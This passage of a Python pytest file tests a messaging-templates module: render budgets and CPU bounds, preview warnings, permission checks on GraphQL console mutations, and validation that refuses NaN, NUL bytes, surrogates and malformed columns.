    for name, source in MULTIPLIED.items():
        refusals = _refusals(_unsaved(source=source, key=f"tests.{name}"))
        assert refusals == [f"tests.{name}: its html form holds over 2000 template spans"], refusals
    assert read == []


@pytest.fixture
def work(monkeypatch: pytest.MonkeyPatch) -> dict[str, list[Any]]:
    """Record what walks and renders do: each row checked, each tree's nodes, outputs and text, each pass's charges."""

    seen: dict[str, list[Any]] = {"trees": [], "passes": [], "checked": []}
    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: seen["checked"].append(
        len(row.source) + len(row.text_source)))
    _recording(monkeypatch, _TreeWalker, "close", lambda walker, tree: seen["trees"].append(
        (str(tree.form), tree.nodes, tree.outputs, tree.text)))
    _recording(monkeypatch, RenderBudget, "spend", lambda budget: seen["passes"].append(budget))
    return seen


def _charges(budgets: list[RenderBudget]) -> list[tuple[int, int, int]]:
    """What each pass spent: iterations, loop output and filter input."""

    return [
        (budget.limits["iterations"] - budget.left["iterations"], budget.limits["output"] - budget.left["output"],
         budget.limits["filter_input"] - budget.left["filter_input"])
        for budget in budgets
    ]


LINES = [("subject", 1, 0, 9), ("preheader", 1, 0, 11)]
PASS_WORK = {
    # Each tree's (piece, nodes, outputs, text); each pass's (iterations, loop output, filter input) charged.
    "q1-deep-operands": ([("html", 976, 4, 133), ("text", 4, 0, 1), *LINES], [(0, 0, 0), (500, 16_000, 0), (0, 0, 0)]),
    "q11b-combined": (
        [("html", 997, 4, 134), ("text", 4, 0, 1), *LINES], [(0, 0, 0), (500, 16_500, 500_000), (0, 0, 0)],
    ),
    "p11-outputs-outside-loops": (
        [("html", 312, 294, 110), ("text", 4, 0, 1), *LINES], [(0, 0, 0), (0, 0, 0), (0, 0, 0)],
    ),
}
"""The work of the costliest passes: at the node, output and budget caps, which bound their CPU."""


@pytest.mark.parametrize("name", list(PASS_CASES))
def test_the_costliest_pass_does_bounded_work(plain: Any, kit: Any, work: dict[str, list[Any]], name: str) -> None:
    """D4: the work of the passes ``test_pass_time`` times, as the walk counts it and the budget charges it."""

    del plain
    walk, values = _pass_case(name)
    with system_context(reason="tests.messaging_templates.render.work"):
        walk.render(values, kit=kit)
    trees, charges = PASS_WORK[name]
    assert work["trees"] == trees and _charges(work["passes"]) == charges
    # The charges are counted against the budget's own limits: the costliest cases reach them.
    assert RenderBudget().limits == {"iterations": 500, "output": 200_000, "filter_input": 500_000}
    assert RenderBudget().limits == {  # the defaults a sender reads are the exported limits
        "iterations": RENDER_ITERATION_LIMIT, "output": RENDER_OUTPUT_LIMIT, "filter_input": RENDER_FILTER_INPUT_LIMIT,
    }
    assert RenderBudget.for_lines().limits == {"iterations": 50, "output": 20_000, "filter_input": 50_000}


PREVIEW_WORK: dict[str, tuple[int, list[tuple[str, int, int, int]], list[tuple[int, int, int]]]] = {
    # Source the walk checks; each tree's (piece, nodes, outputs, text); each pass's charges, as PASS_WORK.
    "admitted": (
        130_977, [("html", 971, 4, 134), ("text", 956, 0, 32), *LINES],
        [(0, 0, 0), (500, 15_936, 498_000), (498, 15_936, 498_000)],
    ),
    "review": (
        149_981, [("html", 983, 4, 144), ("text", 966, 0, 42), ("subject", 8, 0, 0), LINES[1]],
        [(50, 0, 30_000), (453, 18_900, 450_000), (450, 18_900, 450_000)],
    ),
    "review-subject": (
        149_981, [("html", 983, 4, 144), ("text", 966, 0, 42), ("subject", 8, 0, 0), LINES[1]], [(51, 0, 30_000)],
    ),
    # Stopped while gathering: the third row's text passes the tree's text cap before any tree is walked.
    "refused": (100_012, [], []),
    # Refused at the root's own check: its form holds over 2,000 spans, so no part is reached and nothing walked.
    "headings": (49_076, [], []),
    "quotes": (11_985, [], []),
    "single": (7_882, [], []),
    "fivedeep": (4_930, [], []),
    "thousand": (6_304, [], []),
    "combined": (19_515, [], []),
    # The costliest admitted Markdown: the review case's work exactly, its parts opening on one [ each.
    "onebracket": (
        149_985, [("html", 983, 4, 144), ("text", 966, 0, 42), ("subject", 8, 0, 0), LINES[1]],
        [(50, 0, 30_000), (453, 18_900, 450_000), (450, 18_900, 450_000)],
    ),
    # Refused by each part's own label-scan cap, before the Markdown pass runs.
    "images": (149_981, [], []),
    "rules": (49_068, [], []),
    "dated": (
        23_322, [("html", 579, 284, 382), ("text", 569, 280, 281), *LINES], [(0, 0, 0), (500, 0, 0), (500, 0, 0)],
    ),
}
"""The work of the costliest previews: the walk's 150,000 characters, its caps, and every pass's budget."""


def test_prepare_asks_each_format_once_whatever_the_number_of_values(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Section 3: prepare() costs a constant per declared path per value; formats are judged once each."""

    del plain
    calls: list[str] = []
    _recording(monkeypatch, walker_module, "date_filter", lambda value, name: calls.append(name))
    walk = _walk(_unsaved(format="html", source=_dated(0, 280), text_source=_dated(300, 280),
                          variables={"items.*.when": "x"}))
    assert {path: len(formats) for path, formats in walk.date_paths.items()} == {("items", "*", "when"): 560}
    for items in (1, 500):
        calls.clear()
        with translation.override("en"):
            walk.prepare({"items": DATED_VALUES["items"][:items]})
        assert len(calls) == 560, items
    calls.clear()
    with translation.override("en"):
        walk.prepare({"items": [{"when": "2026-11-24T15:30:00+00:00"}, {"when": "2026-11-24"}] * 250})
    assert len(calls) == 2 * 560  # each format once for each kind of moment met: a datetime and a bare date


def test_the_costliest_preview_does_bounded_work(plain: Any, kit: Any, work: dict[str, list[Any]]) -> None:
    """D4: the work of the previews ``test_preview_time`` times: source checked, trees walked, passes charged."""

    del plain
    for name, template in _preview_cases().items():
        work["trees"].clear()
        work["passes"].clear()
        work["checked"].clear()
        with system_context(reason="tests.messaging_templates.render.work"):
            TemplateWalker().judge(template, MessageTemplate.objects)
            source = sum(work["checked"])
            preview = template.preview(kit=kit)
        assert (preview.rendered is not None) is (name in ADMITTED_PREVIEWS), preview.warnings
        assert (source, work["trees"][len(work["trees"]) // 2:], _charges(work["passes"])) == PREVIEW_WORK[name]


@TIMED
@pytest.mark.parametrize("name", list(PASS_CASES))
def test_pass_time(plain: Any, kit: Any, name: str) -> None:
    """A smoke measurement: one pass of the costliest rows the caps admit stays under a second of CPU at the reference
    (passes 2 to 4, one heavy). The counted work of ``test_the_costliest_pass_does_bounded_work`` is the guarantee."""

    del plain
    walk, values = _pass_case(name)
    started = time.process_time()
    with system_context(reason="tests.messaging_templates.render.timed"):
        walk.render(values, kit=kit)
    spent = time.process_time() - started
    print(f"pass CPU {name} {spent:.3f}s load {os.getloadavg()[0]:.0f}")  # noqa: T201 -- the report quotes it
    assert spent < _scaled(1.0), (spent, _scaled(1.0))


@TIMED
def test_preview_time(plain: Any, kit: Any) -> None:
    """A smoke measurement: the costliest previews and renders the caps admit, their walks and prepare(), and
    ``review`` written into another saved row as a patch, validated as its save would be, stay under two seconds of
    CPU at the reference, and the refused cases stop as soon. It catches a gross regression; the counted work of
    ``test_the_costliest_preview_does_bounded_work`` is the guarantee."""

    del plain
    cases, edited, patch = _patched_cases()
    spent: dict[str, float] = {}
    for name, template in cases.items():
        started = time.process_time()
        with system_context(reason="tests.messaging_templates.render.timed"):
            preview = template.preview(kit=kit)
        spent[name] = round(time.process_time() - started, 3)
        assert (preview.rendered is not None) is (name in ADMITTED_PREVIEWS), preview.warnings
        if name in ADMITTED_PREVIEWS:
            with system_context(reason="tests.messaging_templates.render.timed"):
                started = time.process_time()
                walk = TemplateWalker().walk(template, MessageTemplate.objects)
                spent[f"{name} walk"] = round(time.process_time() - started, 3)
                started = time.process_time()
                with translation.override(walk.language):
                    walk.prepare(template.sample)
                spent[f"{name} prepare"] = round(time.process_time() - started, 3)
                started = time.process_time()
                template.render(template.sample, kit=kit)
                spent[f"{name} render"] = round(time.process_time() - started, 3)
    started = time.process_time()
    with system_context(reason="tests.messaging_templates.render.timed"):
        patched = edited.preview(kit=kit, patch=patch)
    spent["review patched"] = round(time.process_time() - started, 3)
    assert patched.rendered is not None, patched.warnings
    print(f"preview CPU {spent} load {os.getloadavg()[0]:.0f}")  # noqa: T201 -- the report quotes it
    bound = _scaled(2.0)
    print(f"preview bound {bound:.3f}s (2.0 s at the reference)")  # noqa: T201 -- the report quotes it
    assert max(spent.values()) < bound, (spent, bound)
    # The costliest admitted Markdown, measured back to back with the review case it extends.
    assert spent["onebracket"] < 1.3 * spent["review"], spent


PATCHED_COLUMNS = ("source", "text_source", "subject", "variables", "sample")
"""The columns that make ``review`` the costliest admitted preview, written into another saved row as a patch."""


def _patched_cases() -> tuple[dict[str, Any], Any, dict[str, Any]]:
    """The preview cases, a saved template of one line, and the patch writing ``review``'s columns into it."""

    cases = _preview_cases()
    edited = _mail("Hello.", key="tests.edited", format="html", text_source="Hello.")
    return cases, edited, {name: getattr(cases["review"], name) for name in PATCHED_COLUMNS}


def test_a_patched_preview_walks_once(plain: Any, kit: Any, work: dict[str, list[Any]]) -> None:
    """A patch that changes what renders is walked once, by ``clean()``, and rendered from that walk; one that
    changes only the sample is walked once, as the saved row is. Either checks each row it reaches once and does
    the work of the saved row's preview."""

    del plain
    cases, edited, patch = _patched_cases()
    for row, patched in ((edited, patch), (cases["review"], {"sample": cases["review"].sample})):
        for seen in work.values():
            seen.clear()
        with system_context(reason="tests.messaging_templates.render.work"):
            preview = row.preview(kit=kit, patch=patched)
        assert preview.rendered is not None, preview.warnings
        assert (sum(work["checked"]), work["trees"], _charges(work["passes"])) == PREVIEW_WORK["review"], row.key


# ---------- preview, its warnings and its read ----------


def test_preview_warnings(plain: Any, kit: Any) -> None:
    del plain
    template = _mail(
        "{{ name }}", {"name": "x", "spare": "x", "unsubscribe_url": "x"},
        subject="s" * 61, preheader="", sample={"name": "Ana", "unsubscribe_url": "https://example.test/stop"},
    )
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = template.preview(kit=kit)
    assert {warning.code for warning in preview.warnings} == {
        TemplateWarningCode.SUBJECT_LENGTH, TemplateWarningCode.PREHEADER, TemplateWarningCode.UNUSED_VARIABLE,
        TemplateWarningCode.STOP_LINK,
    }
    assert any("spare" in warning.detail for warning in preview.warnings)
    assert [warning.detail for warning in preview.warnings if warning.code == TemplateWarningCode.PREHEADER] == [
        "The preheader is missing: an inbox shows the start of the body after the subject instead."]
    long = _mail("{{ name }}", {"name": "x"}, key="tests.long", preheader="p" * 101, sample={"name": "Ana"})
    with system_context(reason="tests.messaging_templates.render.preview"):
        assert [warning.detail for warning in long.preview(kit=kit).warnings
                if warning.code == TemplateWarningCode.PREHEADER] == ["The preheader is 101 characters long."]
    empty = _mail("{% if name %}{% endif %}", {"name": "x"}, key="tests.empty", sample={"name": ""})
    big = _mail("{{ name }}" * 11, {"name": "x"}, key="tests.big", sample={"name": "x" * 9_999},
                format="html", text_source="x")
    with system_context(reason="tests.messaging_templates.render.preview"):
        assert TemplateWarningCode.PLAIN_TEXT in {warning.code for warning in empty.preview(kit=kit).warnings}
        assert TemplateWarningCode.SIZE in {warning.code for warning in big.preview(kit=kit).warnings}


def test_a_layout_previews_around_a_fixed_body_and_a_block_alone(plain: Any, kit: Any) -> None:
    with system_context(reason="tests.messaging_templates.render.preview"):
        layout = plain.preview(kit=kit)
        block = _row("block", "card", source="<b>{{ title }}</b>", text_source="{{ title }}",
                     variables={"title": "x"}, sample={"title": "Tuner"}).preview(kit=kit)
    assert layout.rendered is not None and "<title>A message in this layout</title>" in layout.rendered.html
    assert "A template writes its message here." in layout.rendered.plain_text
    assert block.rendered is not None and block.rendered.html == "<b>Tuner</b>"
    assert block.warnings == []


def test_a_patch_renders_on_a_copy_and_writes_only_the_columns_an_administrator_edits(plain: Any, kit: Any) -> None:
    """A patch renders on a copy of the row, which keeps its own values, and holds edited columns alone: the row's
    identity, its flag and its hashes are refused before anything is copied or walked."""

    del plain
    row = _mail("Hello.")
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = row.preview(kit=kit, patch={"source": "Edited."})
    assert preview.rendered is not None and "Edited." in preview.rendered.plain_text
    assert (row.source, row.content_hash) == ("Hello.", MessageTemplate._base_manager.get(pk=row.pk).content_hash)
    for column in ("kind", "key", "is_baseline", "content_hash"):
        with system_context(reason="tests.messaging_templates.render.preview"), pytest.raises(
                ValueError, match=f"never {column}"):
            row.preview(kit=kit, patch={"source": "Edited.", column: "x"})


def test_deleting_an_included_block_or_part_is_refused_while_its_key_would_stop_resolving(plain: Any) -> None:
    del plain
    part = _row("part", "used", source="Used.")
    _row("part", "used", language="es", source="Usado.")
    _row("part", "unused", source="Unused.")
    _mail('{% include "parts/used" only %}')
    with system_context(reason="tests.messaging_templates.render.delete"):
        with pytest.raises(ValidationError, match="Other message templates use this part"):
            part.delete()
        MessageTemplate.objects.get(key="unused").delete()
        MessageTemplate.objects.get(key="used", language="es").delete()


def test_a_delete_checks_the_rows_naming_its_key_each_time(plain: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """The delete preview and the pre_delete receiver each check the rows naming a key: no state outlives a call."""

    del plain
    part = _row("part", "shared", source="Shared.")
    for index in range(3):
        _mail('{% include "parts/shared" only %}' + f"\n\nNaming {index}.", key=f"tests.naming{index}")
    checked: list[str] = []
    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: checked.append(name))
    with system_context(reason="tests.messaging_templates.render.delete"):
        first = MessageTemplate.objects.get(pk=part.pk).delete_blocker()
        second = MessageTemplate.objects.get(pk=part.pk).delete_blocker()
    assert first is not None and first == second
    assert len(checked) == 6


def test_a_load_reports_what_a_deployment_row_breaks_and_completes(
    plain: Any, kit: Any, caplog: pytest.LogCaptureFixture,
) -> None:
    """D1: a refusal reached only through a deployment's row is logged, not raised; a shipped defect fails the load."""

    del plain
    _row("layout", "shipped", is_baseline=True)
    shipped = _row("part", "named", source="{{ who|default:'' }}", variables={"who": "x"}, is_baseline=True)
    template = _row("template", "tests.loaded", source='{% include "parts/named" with who=name only %}',
                    variables={"name": "x"}, layout="shipped", is_baseline=True)
    with system_context(reason="tests.messaging_templates.render.load"):
        override = MessageTemplate.objects.override(shipped)
        override.source, override.variables = "{{ who }} {{ extra }}", {"who": "x", "extra": "x"}
        override.save()  # past clean: the override asks for an argument the shipped template never passes
        with caplog.at_level(logging.WARNING, logger="angee.messaging_templates.models"):
            MessageTemplate.after_resource_load([template], tier="install", source="tests")
        template.source += "\n\nMore."
        template.full_clean()  # a baseline is judged among the shipped rows alone
    (record,) = [record for record in caplog.records if record.name == "angee.messaging_templates.models"]
    assert "tests.loaded (en)" in record.getMessage() and "parts/named (en)" in record.getMessage()
    assert "which it was not passed" in record.getMessage()
    with pytest.raises(ValidationError, match="which it was not passed"):
        _render(template, {"name": "Ana"}, kit)
    _row("part", "needy", source="{{ needed }}", variables={"needed": "x"}, is_baseline=True)
    broken = _row("template", "tests.broken", source='{% include "parts/needy" only %}', layout="shipped",
                  is_baseline=True)
    with system_context(reason="tests.messaging_templates.render.load"), pytest.raises(
            ValidationError, match="which it was not passed"):
        MessageTemplate.after_resource_load([broken], tier="install", source="tests")


_PREVIEW = """
query($id: ID!, $kit: ID) {
  message_template_preview(template: $id, brand_kit: $kit) {
    rendered { subject preheader html plain_text language }
    warnings { code detail }
  }
}
"""


def test_preview_is_an_administrators_read(plain: Any, kit: Any) -> None:
    del plain
    admin = create_platform_admin("messaging-templates-previewer")
    member = create_user("messaging-templates-reader")
    template = _mail("Hi {{ name }}, from {{ brand.name }}.", {"name": "x"}, sample={"name": "Ana"})
    with system_context(reason="tests.messaging_templates.render.kit"):
        other = BrandKit.objects.create(**{**ANGEE, "name": "Other"})
    schema = addon_schema(messaging_templates_schema.schemas, "console")
    variables = {"id": public_id_of(template), "kit": None}
    preview = result_data(execute_schema(schema, _PREVIEW, variables, user=admin))["message_template_preview"]
    assert preview["rendered"]["plain_text"] == "Hi Ana, from Acme.\n" and preview["warnings"] == []
    themed = result_data(execute_schema(schema, _PREVIEW, {**variables, "kit": public_id_of(other)}, user=admin))
    assert themed["message_template_preview"]["rendered"]["plain_text"] == "Hi Ana, from Other.\n"
    refusals = {}
    for name, refused in (("member", member), ("anonymous", AnonymousUser())):
        (error,) = execute_schema(schema, _PREVIEW, variables, user=refused).errors
        refusals[name] = (error.extensions["code"], error.message)
    assert refusals["member"][0] == "PERMISSION_DENIED"
    assert refusals["anonymous"] == ("PERMISSION_DENIED", "Authentication required.")
    broken = _mail("{% if %}", key="tests.broken")
    result = result_data(execute_schema(schema, _PREVIEW, {"id": public_id_of(broken), "kit": None}, user=admin))
    assert result["message_template_preview"]["rendered"] is None
    assert result["message_template_preview"]["warnings"][0]["code"] == "RENDER_ERROR"
    assert re.search(r"does not compile", result["message_template_preview"]["warnings"][0]["detail"])


_UPDATE = """
mutation($id: String!, $set: message_templates_set_input!) {
  update_message_templates_by_pk(pk_columns: {id: $id}, _set: $set) { id }
}
"""
_INSERT = "mutation($object: message_templates_insert_input!) { insert_message_templates_one(object: $object) { id } }"
_OVERRIDE = "mutation($id: ID!) { override_message_template(template: $id) { ok message id } }"
_KEEP = "mutation($id: ID!) { keep_message_template_override(template: $id) { ok message id } }"


def test_clean_refuses_a_number_in_variables_and_raises_nothing_else(plain: Any) -> None:
    """clean() hashed a row before judging it walkable, so a NaN in variables raised ValueError, INTERNAL through the
    console. It is judged first, and validate_variables refuses it: a description is words."""

    del plain
    for variables in ({"a": math.nan}, {"a": math.inf}, {"a": "x", "b": {"c": math.nan}}, {"a": 1}):
        row = _unsaved("part", "nan", variables=variables)
        with system_context(reason="tests.messaging_templates.render.clean"), pytest.raises(ValidationError) as raised:
            row.full_clean()
        assert list(raised.value.message_dict) == ["variables"], raised.value.message_dict
    schema = addon_schema(messaging_templates_schema.schemas, "console")
    own = _row("part", "own", source="x")
    for user, code in ((create_platform_admin("messaging-templates-nan-admin"), "VALIDATION"),
                       (create_user("messaging-templates-nan-member"), "PERMISSION_DENIED")):
        result = execute_schema(schema, _UPDATE, {"id": public_id_of(own), "set": {"variables": {"a": math.nan}}},
                                user=user)
        assert [(error.extensions or {}).get("code") for error in result.errors or ()] == [code], result.errors


_JSON_TEXT = st.lists(st.one_of(st.characters(), st.integers(0xD800, 0xDFFF).map(chr)), max_size=8).map("".join)
_JSON_VALUE = st.recursive(
    st.one_of(st.none(), st.booleans(), st.integers(), st.integers(4_301, 5_000).map(lambda digits: 10 ** digits),
              st.floats(), _JSON_TEXT),
    lambda children: st.one_of(st.lists(children, max_size=3), st.dictionaries(_JSON_TEXT, children, max_size=3)),
    max_leaves=6,
)
"""What a JSON document decodes to in Python: lone surrogates, NaN, infinities and long integers among it."""
CLEANED_COLUMNS = (
    "kind", "key", "language", "name", "description", "format", "subject", "preheader", "source", "text_source",
    "layout", "variables", "sample",
)


@settings(deadline=None, max_examples=300, suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(column=st.sampled_from(CLEANED_COLUMNS), value=_JSON_VALUE)
def test_clean_raises_only_validation_error_and_what_it_admits_saves(
    plain: Any, caplog: pytest.LogCaptureFixture, column: str, value: Any,
) -> None:
    """Any value a JSON document decodes to, in any column: full_clean() refuses it with a ValidationError, or admits
    it and the row saves; no unexpected failure is met, and so none is logged, on the way."""

    del plain
    row = _unsaved("part", "stored")
    setattr(row, column, value)
    logged = len(caplog.records)
    with system_context(reason="tests.messaging_templates.render.stored"):
        try:
            row.full_clean()
        except ValidationError:
            event("refused")
            assert [record.getMessage() for record in caplog.records[logged:] if record.levelno >= logging.ERROR] == []
            return
        event("admitted")
        # What PostgreSQL alone refuses, which the SQLite the property saves on would store: a NUL in any string.
        assert not any("\x00" in text for column in CLEANED_COLUMNS for text in _strings(getattr(row, column)))
        with transaction.atomic():
            row.save()
            transaction.set_rollback(True)


def _strings(value: Any) -> Iterator[str]:
    """Every string ``value`` holds, keys included."""

    pending = [value]
    while pending:
        item = pending.pop()
        if isinstance(item, str):
            yield item
        elif isinstance(item, dict):
            pending.extend((*item.keys(), *item.values()))
        elif isinstance(item, list):
            pending.extend(item)


def test_a_nul_is_refused_by_full_clean(plain: Any) -> None:
    """A NUL in text or inside a JSON column's string passed full_clean() and failed at save on PostgreSQL (SQLite
    stores it): refused in every column, keys included; a value nested deeper than JSON writes is refused too."""

    del plain
    nested: Any = "x"
    for _ in range(50_000):
        nested = [nested]
    for column, value in (("name", "a\x00b"), ("description", "a\x00b"), ("source", "a\x00b"),
                          ("sample", {"a": "x\x00y"}), ("sample", {"a\x00": 1}), ("variables", {"a": "x\x00"}),
                          ("description", nested)):
        row = _unsaved("part", "nul")
        setattr(row, column, value)
        with system_context(reason="tests.messaging_templates.render.nul"), pytest.raises(ValidationError) as raised:
            row.full_clean()
        assert column in raised.value.message_dict, (column, raised.value.message_dict)


def test_a_null_json_column_is_refused_in_one_sentence(plain: Any) -> None:
    """variables or sample set to null is refused by Django's own null message alone; clean() adds nothing."""

    del plain
    for column in ("variables", "sample"):
        row = _unsaved("part", "nulled")
        setattr(row, column, None)
        with system_context(reason="tests.messaging_templates.render.null"), pytest.raises(ValidationError) as raised:
            row.full_clean()
        assert raised.value.message_dict == {column: ["This field cannot be null."]}, raised.value.message_dict


def test_a_template_names_its_layout(plain: Any) -> None:
    """An empty layout is refused under layout in words a person can act on, before the walk would reach for a
    layout named layouts/."""

    del plain
    row = _unsaved(format="html", source="<p>Hi</p>", text_source="Hi", layout="")
    with system_context(reason="tests.messaging_templates.render.layout"), pytest.raises(ValidationError) as raised:
        row.full_clean()
    assert raised.value.message_dict == {"layout": [
        "Name the layout this template sits in: a mail renders inside its layout, which gives it its document, its "
        "brand and its stop link."]}


def test_the_console_refuses_what_no_column_can_store(plain: Any) -> None:
    """A surrogate in any text, NaN or an infinity in sample: a VALIDATION answer for whoever may write, never
    INTERNAL; a member is refused the write first."""

    del plain
    schema = addon_schema(messaging_templates_schema.schemas, "console")
    own = _row("part", "own", source="x")
    admin = create_platform_admin("messaging-templates-storer")
    member = create_user("messaging-templates-non-storer")
    for written in ({"source": "a\ud800"}, {"name": "a\udfff"}, {"layout": "\ud800"}, {"sample": {"a": math.nan}},
                    {"sample": {"a": -math.inf}}, {"variables": {"a": math.nan}}, {"name": "a\x00b"},
                    {"description": "a\x00b"}, {"sample": {"a": "x\x00y"}}, {"variables": {"a": "x\x00"}}):
        for user, code in ((admin, "VALIDATION"), (member, "PERMISSION_DENIED")):
            result = execute_schema(schema, _UPDATE, {"id": public_id_of(own), "set": written}, user=user)
            assert [(error.extensions or {}).get("code") for error in result.errors or ()] == [code], (written, user)


def test_the_console_stores_a_carriage_return_as_a_newline(plain: Any, kit: Any) -> None:
    """A writer that saves an instance clean() never saw lost clean()'s newlines: every writer now stores a carriage
    return as a newline, a save past clean() and a console update alike, the content hash describes what is stored,
    and the row renders. The console insert, which seeds its text, is the console module's."""

    del plain
    schema = addon_schema(messaging_templates_schema.schemas, "console")
    admin = create_platform_admin("messaging-templates-crlf")
    written = {"source": "<p>a</p>\r\n<p>b</p>", "text_source": "a\r\nb", "subject": "Hi\r\nthere",
               "preheader": "pre\rheader"}
    _row("template", "tests.crlf", format="html", layout="plain", **written)
    with system_context(reason="tests.messaging_templates.render.crlf"):
        row = MessageTemplate.objects.get(key="tests.crlf")
        assert not any("\r" in getattr(row, column) for column in written), [getattr(row, c) for c in written]
        assert row.content_hash == row.compute_content_hash()
        assert row.preview(kit=kit).rendered is not None
    assert _render(row, {}, kit).subject == "Hi there"
    result = execute_schema(schema, _UPDATE, {"id": public_id_of(row), "set": {"source": "<p>c</p>\r\n"}}, user=admin)
    assert result.errors is None, result.errors
    with system_context(reason="tests.messaging_templates.render.crlf"):
        row.refresh_from_db()
    assert row.source == "<p>c</p>\n" and row.content_hash == row.compute_content_hash()


def test_a_partial_save_hashes_what_the_row_stores(plain: Any) -> None:
    """A save naming some hashed columns hashed the instance's other values too, stored or not: it now hashes the
    stored values of the columns it omits, read under a lock, so the hash describes the stored row."""

    del plain
    row = _row("part", "partial", source="One.")
    with system_context(reason="tests.messaging_templates.render.partial"):
        row.source, row.text_source = "Two.", "never stored"
        row.save(update_fields=["source"])
        stored = MessageTemplate.objects.get(pk=row.pk)
        assert (stored.source, stored.text_source) == ("Two.", "")
        assert stored.content_hash == stored.compute_content_hash()
        first, second = MessageTemplate.objects.get(pk=row.pk), MessageTemplate.objects.get(pk=row.pk)
        second.variables = {"a": "x"}
        second.save()
        first.source = "Three."
        first.save(update_fields=["source"])  # first still holds the variables second replaced
        stored = MessageTemplate.objects.get(pk=row.pk)
        assert stored.variables == {"a": "x"} and stored.content_hash == stored.compute_content_hash()


def test_the_walk_runs_in_clean_after_the_permission_is_decided(
    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The three confirmations (probes j, b, b2): save() never walks; the console update, override, keep and
    preview decide the caller's permission before anything is lexed or compiled, and so does the console insert,
    whose write backend hands it to ``MessageTemplateManager.create_own``: a new language of a shipped row whose
    walk refuses would be seeded from that row and walked, were create not decided first."""

    del plain, kit
    checked: list[str] = []
    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: checked.append(name))
    own = _row("part", "own", source="{% if %}")  # save() of a row the walk refuses
    with system_context(reason="tests.messaging_templates.render.save"):
        own.source = "Still {% if %}"
        own.save(update_fields=["source"])
        assert checked == []
        own.source = "Changed {% if %}"  # clean() walks what changed
        with pytest.raises(ValidationError, match="does not compile"):
            own.full_clean()
        own.refresh_from_db()
    assert checked
    shipped = _row("part", "shipped", source="{% if %}", is_baseline=True)
    schema = addon_schema(messaging_templates_schema.schemas, "console")
    member = create_user("messaging-templates-writer")
    cases: dict[str, tuple[str, dict[str, Any]]] = {
        "insert": (_INSERT, {"object": {"kind": "part", "key": "shipped", "language": "es", "name": "Spanish"}}),
        "update": (_UPDATE, {"id": public_id_of(own), "set": {"source": "{% if %} again"}}),
        "override": (_OVERRIDE, {"id": public_id_of(shipped)}),
        "keep": (_KEEP, {"id": public_id_of(own)}),
        "preview": (_PREVIEW, {"id": public_id_of(own), "kit": None}),
    }
    refusals = {
        ("insert", "member"): ("PERMISSION_DENIED", "lacks 'create'"),
        ("insert", "anonymous"): ("PERMISSION_DENIED", "lacks 'create'"),
        ("update", "member"): ("PERMISSION_DENIED", "cannot write"),
        ("update", "anonymous"): ("VALIDATION", "not found"),
        ("override", "member"): ("PERMISSION_DENIED", "lacks 'create'"),
        ("keep", "member"): ("PERMISSION_DENIED", "lacks 'write'"),
        ("preview", "member"): ("PERMISSION_DENIED", "lacks 'preview'"),
    }
    for name, (document, variables) in cases.items():
        for label, user in (("member", member), ("anonymous", AnonymousUser())):
            checked.clear()
            result = execute_schema(schema, document, variables, user=user)
            assert checked == [], (name, label)
            code, said = refusals.get((name, label), ("PERMISSION_DENIED", "Authentication required."))
            (error,) = result.errors or [None]
            assert error is not None and (error.extensions or {}).get("code") == code and said in error.message, (
                name, label, result.errors)
    with system_context(reason="tests.messaging_templates.render.save"):
        assert MessageTemplate.objects.get(pk=own.pk).source == "Still {% if %}"
        assert not MessageTemplate.objects.filter(key="shipped", language="es").exists()
